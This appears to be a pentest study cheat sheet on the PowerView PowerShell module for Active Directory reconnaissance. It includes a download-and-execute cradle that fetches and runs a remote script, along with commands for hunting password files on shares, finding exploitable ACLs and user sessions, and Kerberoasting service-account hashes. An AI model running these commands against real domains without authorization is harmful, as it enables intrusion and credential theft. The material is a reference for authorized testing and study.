# 03.27 PowerView

> PowerShell-native AD enumeration cmdlets — Get-DomainUser, Find-DomainShare, Invoke-Kerberoast.

## Overview

PowerView is the classic offensive AD PowerShell module. Part of PowerSploit. Exposes Get-Domain*, Find-Domain*, Add-Domain*, Set-DomainObject etc. — every offensive AD operation as a PowerShell cmdlet. Run from a Windows host (or via PowerShell on Linux). Many CRTP/CRTO workflows still expect PowerView.

## Steps

- **Step 1** - Get PowerView.ps1 from PowerSploit or dev branch.
- **Step 2** - Import in PowerShell session.
- **Step 3** - Run cmdlets — Get-Help for any one shows arguments.

## Commands

### Get PowerView

```powershell
# Dev branch — newest features
iwr -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -OutFile PowerView.ps1
. .\PowerView.ps1
# Or inline:
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
```

### Domain enumeration

```powershell
Get-Domain
Get-DomainController
Get-DomainSID
Get-DomainTrust
Get-DomainPolicy
```

### User enumeration

```powershell
Get-DomainUser
Get-DomainUser -Identity <USER>
Get-DomainUser -SPN                                 # kerberoastable
Get-DomainUser -PreauthNotRequired                  # asrep-roastable
Get-DomainUser -Properties samaccountname,memberof
```

### Group + computer

```powershell
Get-DomainGroupMember 'Domain Admins' -Recurse
Get-DomainComputer -OperatingSystem 'Windows Server*'
Get-DomainComputer -UnConstrained                   # unconstrained delegation
```

### ACL hunting

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner' }
Get-DomainObjectAcl -Identity <USER> -ResolveGUIDs
```

### Share hunting

```powershell
Find-DomainShare
Find-InterestingDomainShareFile -Include '*password*','*config*','*backup*'
Find-LocalAdminAccess                              # where you have local admin
```

### Session hunting

```powershell
Find-DomainUserLocation -UserIdentity <USER>       # which hosts user is logged in
Invoke-UserHunter -ShowAll                          # all sessions across domain
```

### Kerberoast inline

```powershell
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
```
